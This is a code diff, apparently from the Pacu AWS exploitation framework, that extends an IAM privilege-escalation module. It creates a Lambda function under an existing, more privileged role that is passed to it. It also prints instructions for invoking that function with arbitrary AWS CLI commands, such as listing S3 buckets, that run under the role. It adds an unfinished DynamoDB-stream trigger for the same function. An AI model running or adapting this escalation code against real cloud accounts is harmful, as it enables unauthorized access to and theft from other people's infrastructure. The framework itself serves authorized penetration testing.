@@ -1338,10 +1338,87 @@ def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
 
 
 def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-
     print('  Starting method PassExistingRoleToNewLambdaThenInvoke...\n')
     
+    try:
+        function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data)
+        print('To make use of the new privileges, you need to invoke the newly created function. The function accepts input in the format as follows:\n\n{"cmd": "<aws cli command>"}\n\nWhen invoking the function, pass that JSON object as input, but replace <aws cli command> with an AWS CLI command that you would like to execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has S3 privileges, so you invoke this newly created Lambda function with the input {"cmd": "aws s3 ls"} and it will respond with all the buckets in the account.')
+        print('Example AWS CLI command to invoke the new Lambda function and execute "aws s3 ls" can be seen here:\n')
+        print('aws lambda invoke --function-name {} --region {} --payload file://payload.json --profile CurrentAWSKeys Out.txt\n'.format(function_name, region))
+        print('The file "payload.json" would include this object: {"cmd": "aws s3 ls"}. The results of the API call will be stored in ./Out.txt as well.\n')
+        return True
+    except Exception as error:
+        print('Failed to create a new Lambda function: {}\n'.format(error))
+        return False
+
+
+def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input, fetch_data):
+    print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithNewDynamo...\n')
+    
+    # Create Lambda function
+    try:
+        function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data)
+    except Exception as error:
+        print('Failed to create a new Lambda function: {}\n'.format(error))
+        return False
+
+    client = pacu_main.get_boto3_client('dynamodb', region)
+    dynamo_table_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    
+    # Create DynamoDB table
+    try:
+        response = client.create_table(
+            TableName=dynamo_table_name,
+            AttributeDefinitions=[
+                {
+                    'AttributeName': 'attr',
+                    'AttributeType': 'S'
+                }
+            ],
+            KeySchema=[
+                {
+                    'AttributeName': 'attr',
+                    'KeyType': 'HASH'
+                }
+            ],
+            ProvisionedThroughPut={
+                'ReadCapacityUnits': 5,
+                'WriteCapacityUnits': 5
+            },
+            StreamSpecification={
+                'StreamEnabled': True,
+                'StreamViewType': 'KEYS_ONLY'
+            }
+        )
+        stream_arn = response['LatestStreamArn']
+        print('Successfully created new DynamoDB table {}!\n'.format(dynamo_table_name))
+    except Exception as error:
+        print('Failed to create new DynamoDB table: {}\n'.format(error))
+        return False
+
+    # Create Lambda event source mapping
+    try:
+        client = pacu_main.get_boto3_client('lambda', region)
+        client.create_event_source_mapping(
+            FunctionName=function_name,
+            EventSourceArn=stream_arn,
+            Enabled=True,
+            BatchSize=1,
+            StartingPosition='LATEST'
+        )
+    except Exception as error:
+        print('Failed to create Lambda event source mapping: {}\n'.format(error))
+        return False
+
+    ### YOU ARE HERE
+    # Give instructions on how to invoke the function through DynamoDB PutItem
+
+def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
+    return
+
+
+def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
     regions = pacu_main.get_regions('lambda')
     region = None
 
@@ -1387,34 +1464,18 @@ def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
     with open('./modules/{}/lambda.zip'.format(module_info['Name']), 'rb') as f:
         lambda_zip = f.read()
 
-    try:
-        response = client.create_function(
-            FunctionName=function_name,
-            Runtime='python3.6',
-            Role=target_role_arn,
-            Code={
-                'ZipFile': lambda_zip
-            },
-            Timeout=30,
-            Handler='lambda_function.lambda_handler'
-        )
-        print('Successfully created a Lambda function {} in region {}!'.format(function_name, region))
-        print('To make use of the new privileges, you need to invoke the newly created function. The function accepts input in the format as follows:\n\n{"cmd": "<aws cli command>"}\n\nWhen invoking the function, pass that JSON object as input, but replace <aws cli command> with an AWS CLI command that you would like to execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has S3 privileges, so you invoke this newly created Lambda function with the input {"cmd": "aws s3 ls"} and it will respond with all the buckets in the account.')
-        print('Example AWS CLI command to invoke the new Lambda function and execute "aws s3 ls" can be seen here:\n')
-        print('aws lambda invoke --function-name {} --region {} --payload file://payload.json --profile CurrentAWSKeys Out.txt\n'.format(function_name, region))
-        print('The file "payload.json" would include this object: {"cmd": "aws s3 ls"}. The results of the API call will be stored in ./Out.txt as well.\n')
-        return True
-    except Exception as error:
-        print('Failed to create the Lambda function {}: {}\n'.format(function_name, error))
-        return False
-
-
-def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input, fetch_data):
-    return
-
-
-def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
-    return
+    response = client.create_function(
+        FunctionName=function_name,
+        Runtime='python3.6',
+        Role=target_role_arn,
+        Code={
+            'ZipFile': lambda_zip
+        },
+        Timeout=30,
+        Handler='lambda_function.lambda_handler'
+    )
+    print('Successfully created a Lambda function {} in region {}!'.format(function_name, region))
+    return (function_name, region)
 
 
 def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
